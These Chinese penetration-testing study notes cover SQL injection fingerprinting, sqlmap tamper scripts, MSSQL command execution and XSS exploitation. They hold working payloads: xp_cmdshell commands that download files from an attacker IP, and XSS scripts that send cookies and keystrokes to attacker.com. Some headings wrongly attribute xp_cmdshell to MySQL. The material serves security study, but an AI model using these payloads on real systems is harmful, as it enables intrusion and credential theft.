<p><strong>SQL Server 端代码</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建 Assembly</span></span><br><span class="line"><span class="keyword">CREATE</span> ASSEMBLY CommandExec <span class="keyword">FROM</span> <span class="string">&#x27;C:\path\to\YourAssembly.dll&#x27;</span> <span class="keyword">WITH</span> PERMISSION_SET <span class="operator">=</span> UNSAFE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建存储过程</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> sp_CmdExec <span class="variable">@command</span> NVARCHAR(<span class="number">4000</span>) <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">EXTERNAL</span> NAME [YourAssembly].[StoredProcedures].[CmdExec];</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_CmdExec <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：CLR Assembly 功能通常默认禁用，且创建 UNSAFE 权限集的 Assembly 需要 sysadmin 权限。</p>
<h2 id="MySQL5-0上下版本区别"><a href="#MySQL5-0上下版本区别" class="headerlink" title="MySQL5.0上下版本区别"></a>MySQL5.0上下版本区别</h2><h4 id="information-schma的有无"><a href="#information-schma的有无" class="headerlink" title="information_schma的有无"></a><strong>information_schma的有无</strong></h4><p>5.0版本以上：有，<strong>方便枚举出整个数据库的结构</strong>，使用像 <strong>SQLmap</strong> 这样的自动化工具<br>5.0版本以下：无，<strong>依赖盲注和字典攻击</strong></p>
<h4 id="并发操作模式"><a href="#并发操作模式" class="headerlink" title="并发操作模式"></a>并发操作模式</h4><p><strong>MySQL 5.0 以下</strong>：</p>
<ul>
<li><strong>多用户单操作</strong>：这个说法通常是指<strong>不完全支持多用户并发</strong>，或者并发控制机制相对简单。在某些版本中，对同一资源的并发访问可能导致锁定和性能问题。从渗透角度看，这可能导致一些复杂的注入技术（如基于锁定的时间盲注）效果不佳，但影响相对较小</li>
</ul>
<p><strong>MySQL 5.0 及以上</strong>：</p>
<ul>
<li><strong>多用户多操作</strong>：这通常指的是<strong>更好的并发控制</strong>和<strong>事务支持</strong>。MySQL 5.0 引入了<strong>事务</strong>和更强大的锁机制，使得多个用户可以同时对数据库进行复杂操作，而不会相互干扰。这对于正常的业务应用至关重要</li>
</ul>
<h2 id="SQLMap自带的脚本"><a href="#SQLMap自带的脚本" class="headerlink" title="SQLMap自带的脚本"></a>SQLMap自带的脚本</h2><p><strong>1. 编码与混淆（绕过签名检测）</strong><br>这类脚本通过对注入语句进行编码或转换，来改变其特征，以躲避基于签名的检测</p>
<ul>
<li><p><code>charencode.py</code>：对所有字符进行 URL 编码，适用于 URL 编码绕过</p>
</li>
<li><p><code>randomcase.py</code>：将 SQL 关键字的字母大小写随机化</p>
</li>
<li><p><strong>示例：</strong> <code>SELECT</code> -&gt; <code>sELeCT</code></p>
</li>
<li><p><code>space2comment.py</code>：将空格替换为 SQL 注释 <code>/**/</code></p>
</li>
<li><p><strong>示例：</strong> <code>SELECT user FROM users</code> -&gt; <code>SELECT/**/user/**/FROM/**/users</code></p>
</li>
<li><p><code>space2mysqlblank.py</code>：用 MySQL 专有的空格字符（如 Tab、换行符）替换空格</p>
</li>
<li><p><code>base64encode.py</code>：对整个注入语句进行 Base64 编码。需要目标网站解码才能生效</p>
</li>
</ul>
<p><strong>2. 空白字符与分隔符替换</strong><br>这类脚本利用不同数据库对空白字符的解析差异来绕过过滤</p>
<ul>
<li><p><code>apostrophemask.py</code>：将单引号 <code>&#39;</code> 替换为 UTF-8 编码的 <code>&#39;</code></p>
</li>
<li><p><code>equaltolike.py</code>：将等号   &#x3D;   替换为 <code>LIKE</code> 关键字</p>
</li>
<li><p><strong>示例：</strong> <code>id=1</code> -&gt; <code>id LIKE 1</code></p>
</li>
<li><p><code>unionalltounion.py</code>：将 <code>UNION ALL</code> 替换为 <code>UNION</code>，在某些情况下可能绕过过滤</p>
</li>
<li><p><code>space2plus.py</code>：将空格替换为加号 <code>+</code>，但需要注意这可能影响语句语义</p>
</li>
</ul>
<p><strong>3. 语义与结构混淆</strong><br>这类脚本通过改变语句的逻辑结构，来使注入语句看起来像正常的查询</p>
<ul>
<li><p><code>between.py</code>：将大于等于 <code>&gt;=</code> 替换为 <code>BETWEEN</code></p>
</li>
<li><p><strong>示例：</strong> <code>id&gt;=1</code> -&gt; <code>id BETWEEN 1 AND 999</code></p>
</li>
<li><p><code>ifnull2casewhenisnull.py</code>：将 <code>IFNULL(A, B)</code> 替换为 <code>CASE WHEN ISNULL(A) THEN B ELSE A END</code></p>
</li>
</ul>
<p><strong>4. 绕过 WAF 的特定脚本</strong><br>这些脚本通常针对特定的安全产品或通用 WAF 规则</p>
<ul>
<li><p><code>modsecurityzeroversioned.py</code>：在 SQL 语句后添加 <code>/*-!11111*/</code> 来绕过 ModSecurity WAF 的特定规则</p>
</li>
<li><p><code>xforwardedfor.py</code>：在 HTTP 请求头中伪造 <code>X-Forwarded-For</code> 字段，以绕过基于 IP 的限制</p>
</li>
<li><p><code>sp_password.py</code>：在有效载荷的末尾添加 <code>sp_password</code> 来绕过 MS-SQL Server 的日志记录</p>
</li>
</ul>
<h2 id="扫出-asp数据库，访问乱码怎么利用"><a href="#扫出-asp数据库，访问乱码怎么利用" class="headerlink" title="扫出.asp数据库，访问乱码怎么利用"></a>扫出.asp数据库，访问乱码怎么利用</h2><p>用微软的access打开<br>用<img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289593014-0a1aeb5c-f0b1-404d-bc2f-ecc12b80b8c8.jpg" referrerpolicy="no-referrer" alt="null">打开<br>如果密码字段是加密或散列（hash）的，需要进一步处理<br><strong>常见哈希类型</strong>：MD5、SHA1 等<br>破解方法：<br>在线查询：如果哈希值是常见的，可以尝试在 HashKiller、Crackstation 等在线网站查询。<br>字典破解：使用 John the Ripper 或 Hashcat 等工具，配合强大的密码字典进行暴力破解。<br>彩虹表：使用预先计算好的彩虹表进行快速查询</p>
<h2 id="找到注入点怎么判断何种数据库"><a href="#找到注入点怎么判断何种数据库" class="headerlink" title="找到注入点怎么判断何种数据库"></a>找到注入点怎么判断何种数据库</h2><h4 id="看报错信息"><a href="#看报错信息" class="headerlink" title="看报错信息"></a>看报错信息</h4><ul>
<li><p><strong>MySQL</strong>：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use</code></p>
</li>
<li><p><strong>SQL Server</strong>：<code>Microsoft OLE DB Provider for SQL Server</code>、<code>Incorrect syntax near &#39;...</code></p>
</li>
<li><p><strong>Oracle</strong>：<code>ORA-01756: quoted string not properly terminated</code></p>
</li>
<li><p><strong>PostgreSQL</strong>：<code>PostgreSQL query failed: ERROR: parser: parse error</code></p>
</li>
<li><p><strong>SQLite</strong>：<code>sqlite_query()</code>、<code>SQL syntax error</code></p>
</li>
</ul>
<h4 id="函数和语法判断"><a href="#函数和语法判断" class="headerlink" title="函数和语法判断"></a>函数和语法判断</h4><h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()</span><br><span class="line">sleep()   如果延迟了5秒，可能是MySQL</span><br><span class="line">user()</span><br><span class="line">database()</span><br><span class="line">loadfile()    and load_file(&#x27;/etc/passwd&#x27;)</span><br></pre></td></tr></table></figure>

<h5 id="SQLServer"><a href="#SQLServer" class="headerlink" title="SQLServer"></a>SQLServer</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@@version：and 1=1 and @@version。如果页面返回版本信息，则是 SQL Server</span><br><span class="line"></span><br><span class="line">xp_cmdshell：and 1=1;exec xp_cmdshell(&#x27;ping 127.0.0.1&#x27;)--。如果请求延迟，可能存在命令执行漏洞</span><br><span class="line"></span><br><span class="line">db_name()：and db_name()</span><br><span class="line"></span><br><span class="line">system_user：and system_user</span><br></pre></td></tr></table></figure>

<h5 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user：and user</span><br><span class="line"></span><br><span class="line">sys.dba_tables：and 1=1 and (select count(*) from sys.dba_tables)。如果返回正常的页面，说明存在这张表</span><br><span class="line"></span><br><span class="line">dbms_pipe.receive_message()：and 1=1 and dbms_pipe.receive_message(&#x27;a&#x27;,5)。可以用来进行带外信道（OOB）注入</span><br></pre></td></tr></table></figure>

<h5 id="PostgreSQL-1"><a href="#PostgreSQL-1" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pg_sleep()：and pg_sleep(5)。如果页面延迟，很可能是 PostgreSQL</span><br><span class="line"></span><br><span class="line">version()：and version()</span><br><span class="line"></span><br><span class="line">pg_database：and 1=1 and (select count(*) from pg_database)</span><br></pre></td></tr></table></figure>

<h5 id="不同数据库的查询区别"><a href="#不同数据库的查询区别" class="headerlink" title="不同数据库的查询区别"></a>不同数据库的查询区别</h5><p>每种数据库的查询语法都有一些细微的差别，可以利用这些差异来判断</p>
<ul>
<li><p><strong>字符串拼接</strong>：</p>
</li>
<li><p><strong>MySQL</strong>：<code>union select &#39;a&#39;,&#39;b&#39;</code></p>
</li>
<li><p><strong>SQL Server</strong>：<code>union select &#39;a&#39;+&#39;b&#39;</code></p>
</li>
<li><p><strong>Oracle</strong>：<code>union select &#39;a&#39;||&#39;b&#39;</code></p>
</li>
<li><p><strong>注释符号</strong>：</p>
</li>
<li><p><strong>MySQL&#x2F;PostgreSQL</strong>：<code>--</code> （后面需要加空格）、<code>#</code></p>
</li>
<li><p><strong>SQL Server&#x2F;Oracle</strong>：<code>--</code></p>
</li>
<li><p><strong>内联注释</strong>：<code>/**/</code> 可以在多种数据库中使用</p>
</li>
</ul>
<h2 id="MySQL-一个-和两个-的区别"><a href="#MySQL-一个-和两个-的区别" class="headerlink" title="MySQL 一个 @ 和两个 @ 的区别"></a>MySQL 一个 @ 和两个 @ 的区别</h2><p><code>@</code><strong>（用户自定义变量）</strong></p>
<p>一个 <code>@</code> 符号代表<strong>用户自定义变量</strong>（User-Defined Variables）。这种变量是用户在当前会话中手动创建的，它的生命周期只存在于当前 MySQL 连接会话中。当会话结束时，变量也会被释放</p>
<p><strong>特点：</strong></p>
<ul>
<li><p><strong>创建与赋值</strong>：可以使用 <code>SET</code> 或 <code>SELECT ... INTO</code> 语句来赋值</p>
</li>
<li><p><code>SET @var_name = value;</code></p>
</li>
<li><p><code>SELECT column INTO @var_name FROM table;</code></p>
</li>
<li><p><strong>作用域</strong>：仅在当前连接会话中有效。一个用户设置的 <code>@var_name</code> 无法被其他用户连接访问</p>
</li>
<li><p><strong>用途</strong>：常用于存储临时数据、在多条 SQL 语句中传递值，或者在存储过程、函数中作为临时变量<br><strong>示例：</strong></p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 在当前会话中设置一个变量</span></span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@total_price</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用该变量进行计算</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@total_price</span> <span class="operator">*</span> <span class="number">1.1</span> <span class="keyword">AS</span> price_with_tax;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在另一个新的连接中，@total_price 变量是不存在的，它的值为 NULL。</span></span><br></pre></td></tr></table></figure>

<p><code>@@</code><strong>（系统变量）</strong><br>两个 <code>@</code> 符号代表<strong>系统变量</strong>（System Variables）。这些变量是 MySQL 服务器预先定义好的，用于控制服务器的各种行为和状态<br>系统变量分为两种：</p>
<ul>
<li><p><strong>全局系统变量 (</strong><code>@@global.var_name</code><strong>)</strong>：影响 MySQL 服务器的<strong>所有会话</strong>。需要有 <code>SUPER</code> 权限才能修改</p>
</li>
<li><p><strong>会话系统变量 (</strong><code>@@session.var_name</code> <strong>或</strong> <code>@@var_name</code><strong>)</strong>：仅影响<strong>当前连接会话</strong>。它的值会继承自全局变量，但可以在会话中被单独修改，且不会影响其他会话</p>
</li>
</ul>
<p><strong>特点：</strong></p>
<ul>
<li><p><strong>查看</strong>：可以使用 <code>SHOW VARIABLES</code> 或 <code>SELECT @@var_name</code> 来查看</p>
</li>
<li><p><strong>修改</strong>：使用 <code>SET</code> 语句进行修改</p>
</li>
<li><p><code>SET GLOBAL max_connections = 200;</code></p>
</li>
<li><p><code>SET SESSION sql_mode = &#39;STRICT_TRANS_TABLES&#39;;</code></p>
</li>
<li><p><code>SET sql_mode = &#39;STRICT_TRANS_TABLES&#39;;</code>（<code>SESSION</code> 是默认的）</p>
</li>
<li><p><strong>用途</strong>：管理和调整数据库的各种配置，如最大连接数、字符集、缓冲区大小、SQL 模式等</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看当前会话的字符集</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@character_set_client</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看全局最大连接数</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.max_connections;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在当前会话中改变 SQL 模式，不影响其他会话</span></span><br><span class="line"><span class="keyword">SET</span> sql_mode <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在所有会话中改变 SQL 模式 (需要 SUPER 权限)</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> sql_mode <span class="operator">=</span> <span class="string">&#x27;STRICT_TRANS_TABLES&#x27;</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>特性</th>
<th>@ (用户变量)</th>
<th>@@ (系统变量)</th>
</tr>
</thead>
<tbody><tr>
<td>全称</td>
<td>User-Defined Variable</td>
<td>System Variable</td>
</tr>
<tr>
<td>创建者</td>
<td>用户自定义</td>
<td>MySQL 服务器预定义</td>
</tr>
<tr>
<td>作用域</td>
<td>仅当前会话</td>
<td>全局或当前会话</td>
</tr>
<tr>
<td>主要用途</td>
<td>存储临时数据，方便在多条 SQL 中传递</td>
<td>管理和配置服务器行为</td>
</tr>
<tr>
<td>生命周期</td>
<td>会话结束即失效</td>
<td>随服务器启动而加载</td>
</tr>
<tr>
<td>可否修改</td>
<td>用户随时可改</td>
<td>全局需要 SUPER 权限，会话可自由修改</td>
</tr>
</tbody></table>
<h2 id="为什么MySQL存储过程可以执行命令"><a href="#为什么MySQL存储过程可以执行命令" class="headerlink" title="为什么MySQL存储过程可以执行命令"></a>为什么MySQL存储过程可以执行命令</h2><p><strong>1.</strong> <code>xp_cmdshell</code> <strong>存储过程</strong><br>这是 MySQL 中最著名，也是最危险的命令执行功能</p>
<p><strong>原理</strong><br><code>xp_cmdshell</code> 是一个扩展存储过程（e<strong>x</strong>tended <strong>p</strong>rocedure）。它允许你在 SQL Server 内部执行操作系统的 <code>cmd.exe</code> 命令<br>当你执行 <code>EXEC xp_cmdshell &#39;dir c:\&#39;</code> 时，SQL Server 会：</p>
<ol>
<li><p>启动一个 <code>cmd.exe</code> 进程</p>
</li>
<li><p>将你的命令作为参数传递给 <code>cmd.exe</code></p>
</li>
<li><p>将命令的输出结果以行的形式返回到 SQL Server 的结果集中</p>
</li>
</ol>
<p><strong>使用条件</strong></p>
<p>默认情况下，从 SQL Server 2005 开始，<code>xp_cmdshell</code> 处于<strong>禁用状态</strong>。要成功利用它，需要满足以下两个条件：</p>
<ul>
<li><p><strong>权限</strong>：你必须拥有 <code>sysadmin</code> 服务器角色或**<code>CONTROL SERVER</code>**权限，这是因为 <code>xp_cmdshell</code> 默认只授予这些高权限用户</p>
</li>
<li><p><strong>启用配置</strong>：<code>xp_cmdshell</code> 必须通过以下 SQL 命令手动启用：</p>
</li>
</ul>
<p>`&#96;&#96;sql   sp_configure ‘show advanced options’, 1;   RECONFIGURE;   sp_configure ‘xp_cmdshell’, 1;   RECONFIGURE;   &#96;&#96;&#96;</p>
<p>在渗透测试中，如果成功通过 SQL 注入或其他方式获得了高权限，你就可以执行这些命令来启用 <code>xp_cmdshell</code>，然后执行任意系统命令</p>
<p><strong>2. 其他相关的危险存储过程</strong><br>除了 <code>xp_cmdshell</code>，MSSQL 还有其他一些可以执行命令或辅助命令执行的存储过程，但它们不像 <code>xp_cmdshell</code> 那样直接<br><code>sp_addextendedproc</code></p>
<ul>
<li><p><strong>原理</strong>：这个存储过程允许你将一个外部 DLL 文件注册为 SQL Server 的扩展存储过程</p>
</li>
<li><p><strong>用途</strong>：如果攻击者能上传一个恶意的 DLL 文件到服务器，就可以利用 <code>sp_addextendedproc</code> 将其注册为一个新的扩展存储过程，然后通过执行这个过程来执行恶意代码，从而绕过 <code>xp_cmdshell</code> 的禁用限制</p>
</li>
</ul>
<p><strong>CLR 集成（SQL CLR）</strong></p>
<ul>
<li><p><strong>原理</strong>：SQL Server 允许你使用 .NET 语言（如 C#）编写存储过程、函数、触发器等。这些代码可以调用 .NET 框架中的类库，包括那些可以执行系统命令的类，如 <code>System.Diagnostics.Process</code></p>
</li>
<li><p><strong>用途</strong>：攻击者可以编写一个恶意的 C# 代码，将其编译成 DLL，然后加载到 SQL Server 中。这是一种更隐蔽、更强大的命令执行方法，因为它不依赖于 <code>xp_cmdshell</code></p>
</li>
</ul>
<h2 id="如果想要通过MySQL上传文件需要开启那个存储过程的权限"><a href="#如果想要通过MySQL上传文件需要开启那个存储过程的权限" class="headerlink" title="如果想要通过MySQL上传文件需要开启那个存储过程的权限"></a>如果想要通过MySQL上传文件需要开启那个存储过程的权限</h2><p><strong>1. 利用</strong> <code>xp_cmdshell</code> <strong>存储过程（最常见）</strong></p>
<p>如前面所述，<code>xp_cmdshell</code> 是执行系统命令的利器。一旦你获得了执行 <code>xp_cmdshell</code> 的权限（通常是 <code>sysadmin</code>），就可以通过它来执行命令行下的文件上传操作</p>
<ul>
<li><p><strong>所需权限</strong>：<code>sysadmin</code> 服务器角色或 <code>CONTROL SERVER</code> 权限，并且 <code>xp_cmdshell</code> 必须已启用</p>
</li>
<li><p><strong>实现方法</strong>：</p>
</li>
<li><p><strong>方法一：利用</strong> <code>certutil</code> <strong>下载文件</strong> 这是最常见且非常实用的方法，它利用 Windows 自带的 <code>certutil.exe</code> 工具来下载文件</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;certutil.exe -urlcache -split -f &quot;http://&lt;攻击机IP&gt;/&lt;文件名&gt;&quot; &quot;c:\\&lt;文件保存路径&gt;\\&lt;文件名&gt;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这种方法的好处是，<code>certutil</code> 是 Windows 系统自带的，不容易被杀毒软件拦截</p>
<ul>
<li><strong>方法二：利用 PowerShell 下载文件</strong> 使用 PowerShell 的 <code>Invoke-WebRequest</code> 或 <code>Net.WebClient</code> 方法来下载文件</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell.exe -c &quot;Invoke-WebRequest -Uri http://&lt;攻击机IP&gt;/&lt;文件名&gt; -OutFile c:\\&lt;文件保存路径&gt;\\&lt;文件名&gt;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>或者使用更简单的别名：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell.exe -c &quot;iwr http://&lt;攻击机IP&gt;/&lt;文件名&gt; -OutFile c:\\&lt;文件保存路径&gt;\\&lt;文件名&gt;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>方法三：利用其他命令行工具</strong> 如果目标机器上安装了 <code>wget</code>、<code>curl</code> 等工具，你也可以使用它们</li>
</ul>
<p><strong>2. 利用数据库的</strong> <code>OPENROWSET</code> <strong>或</strong> <code>BULK INSERT</code><br>这种方法相对不那么常见，但如果 <code>xp_cmdshell</code> 被禁用，这是一种可以尝试的备选方案。它主要利用 MSSQL 强大的文件处理能力</p>
<ul>
<li><p><strong>所需权限</strong>：</p>
</li>
<li><p><code>sysadmin</code> 或 <code>bulkadmin</code> 角色</p>
</li>
<li><p><code>BULK INSERT</code> 需要对目标文件夹有写权限，并且 <code>OPENROWSET</code> 必须启用 <code>Ad Hoc Distributed Queries</code></p>
</li>
<li><p><strong>实现方法</strong>：</p>
</li>
<li><p><strong>方法一：</strong><code>OPENROWSET</code> 这种方法可以从一个共享网络路径（UNC Path）读取数据，并插入到数据库表中。虽然它主要用于数据导入，但你可以利用它将文件内容导入到数据库，再通过其他方式导出</p>
</li>
<li><p><strong>方法二：</strong><code>BULK INSERT</code> 和 <code>OPENROWSET</code> 类似，<code>BULK INSERT</code> 也能从网络共享路径读取文件数据</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BULK <span class="keyword">INSERT</span> MyTable   <span class="keyword">FROM</span> <span class="string">&#x27;\\&lt;攻击机IP&gt;\share\&lt;文件名&gt;&#x27;</span>   <span class="keyword">WITH</span> (   ROWTERMINATOR <span class="operator">=</span> <span class="string">&#x27;EOF&#x27;</span>,   DATA_SOURCE <span class="operator">=</span> <span class="string">&#x27;MyDataSource&#x27;</span>   );</span><br></pre></td></tr></table></figure>

<p>这种方法需要 MSSQL 服务的运行用户对网络共享路径有读取权限</p>
<p><strong>3. 利用 SQL CLR 集成</strong><br>这是一种高级且隐蔽的上传文件方法。如果你能够执行 SQL CLR 代码，你就可以编写一个 .NET 存储过程，该存储过程包含文件读写功能</p>
<ul>
<li><p><strong>所需权限</strong>：<code>sysadmin</code> 或 <code>EXTERNAL ACCESS ASSEMBLY</code> 权限</p>
</li>
<li><p><strong>实现方法</strong>：</p>
</li>
<li><p>用 C# 编写一个可以从 URL 下载文件并保存到本地的 DLL</p>
</li>
<li><p>将 DLL 文件上传到服务器，或者通过 <code>xp_cmdshell</code> 下载</p>
</li>
<li><p>使用 SQL 命令将 DLL 注册为 SQL CLR 程序集</p>
</li>
<li><p>执行你编写的存储过程，实现文件上传</p>
</li>
</ul>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>白名单<br>对url实体进行编码<br>CSP</p>
<h2 id="绕过手法-1"><a href="#绕过手法-1" class="headerlink" title="绕过手法"></a>绕过手法</h2><p><strong>大小写混淆绕过</strong><br><strong>空白字符，换行符号和tab绕过</strong><br><strong>编码绕过，url编码</strong><br><strong>标签和属性嵌套绕过</strong><br>有些过滤器可能只过滤顶层的脚本标签，但忽略嵌套的标签，属性名或属性值之间插入空格，换行符(%0a或%0d)或者Tab键（%09）来绕过<br>例如:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">可以写成,加空格</span><br><span class="line">&lt;img src=<span class="string">&quot; javascript:alert(1);&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">可以写成</span><br><span class="line">&lt;script%0a&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>事件处理器绕过</strong><br>除了最常见的onload和onerror事件，还有很多事件可以触发脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onclick</span><br><span class="line">onfocus</span><br><span class="line">onblur</span><br><span class="line">onchange</span><br></pre></td></tr></table></figure>

<p><strong>使用特殊字符绕过</strong><br>一些特殊字符，如反引号,反斜杠,在JavaScript的反引号可以用来包裹字符串并执行代码</p>
<h2 id="xss利用"><a href="#xss利用" class="headerlink" title="xss利用"></a>xss利用</h2><h4 id="窃取cookie和session"><a href="#窃取cookie和session" class="headerlink" title="窃取cookie和session"></a><strong>窃取cookie和session</strong></h4><p>像留言条，评论区都容易产生xss<br>如果是存储型且无审核，可造成大面积窃取登录信息cookie<br>构成盗号等风险</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://attacker.com/cookie_stealer.php?c=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a><strong>键盘记录</strong></h4><p>植入键盘记录器捕获当前页面键盘记录，包括用户名，密码，信息，信用卡号密码，这种方法毫无察觉</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="comment">// 将用户按键信息发送到攻击者服务器</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/keylogger.php?key=&#x27;</span> + e.<span class="property">key</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a><strong>钓鱼攻击</strong></h4><p>通过xss，攻击者可以篡改网页内容，插入虚假的登陆框或提示信息，诱骗用户输入账号和密码，例如在合法的页面弹出一个伪造的登录框，提示用户“你的会话已过期，请重新登录”，用户以为是正常操作，输入这些用户信息，这些信息就会发送到攻击者的服务器上</p>
<h4 id="网页挂马和恶意重定向"><a href="#网页挂马和恶意重定向" class="headerlink" title="网页挂马和恶意重定向"></a><strong>网页挂马和恶意重定向</strong></h4><p>利用xss重定向到恶意网站，或者在当前页面加载而已脚本，例如加密勒索病毒</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://malicious-site.com&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>或者加载恶意脚本</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://malicious-site.com/malware.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="绕过同源策略"><a href="#绕过同源策略" class="headerlink" title="绕过同源策略"></a><strong>绕过同源策略</strong></h4><p>虽然浏览器的同源策略限制了不同源的脚本互相访问，但在某些特定情况下，XSS 可以作为绕过同源策略的第一步。一旦在目标域上执行了脚本，攻击者就可以访问该域下的敏感数据，比如通过 AJAX 请求获取用户的私人信息</p>
